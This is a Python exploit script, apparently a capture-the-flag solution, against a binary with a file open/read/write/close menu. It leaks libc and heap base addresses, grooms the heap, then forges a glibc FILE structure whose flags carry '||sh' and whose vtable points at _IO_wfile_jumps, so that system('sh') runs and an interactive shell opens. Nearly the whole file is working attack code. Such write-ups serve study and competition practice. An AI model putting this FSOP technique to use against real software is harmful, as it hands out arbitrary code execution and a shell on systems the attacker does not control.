#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set max-visualize-chunk-size 0x500
brva 0x1487
brva 0x1549
brva 0x1697
brva 0x1658
brva 0x1697
brva 0x1600
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'> ', choice)

def f_open(size: int, name: bytes):
    menu(1)
    slna(b'size: ', size)
    sa(b'name: ', name)

def f_read():
    menu(2)

def f_write(data: bytes):
    menu(3)
    sla(b'input: ', data)

def f_close():
    menu(4)

# ==================== EXPLOIT ====================
p = start()

f_open(100, b'/tmp/A')
f_write(b'A' * 0x1000)

f_write(b'B' * 0x6)
f_read()

ru(b'B' * 0x6 + b'\n' + b'\x00')

libc.address = u64(rb(6).ljust(0x8, b'\x00')) - 0x21a370
slog('libc base @ %#x', libc.address)

ru(b'\x00\x00')
heap_leak = u64(rb(6).ljust(0x8, b'\x00')) >> 12
heap_base = heap_leak << 12
slog('heap base @ %#x', heap_base)

for _ in range(7):
    f_write(b'A' * 0x100)
    f_close()

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()


f_write(b'A' * 0x100) # This time, the fp store in unsortedbin
f_close()

fileptr = heap_base + 0x2a0
system = libc.symbols['system']
fp = FileStructure(0)
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = fileptr + 0x50
fp._wide_data = fileptr - 0x10
fp.unknown2 =  p64(0) * 3 + p64(0xdeadbeef) + p64(0) + p64(fileptr + 0x10 - 0x68) # padding the mode = 0
fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x30
payload = bytes(fp)

sla(b"> ", b"3")
sla(b"input: ", payload) # Now getline() will read into our fp

interactive()
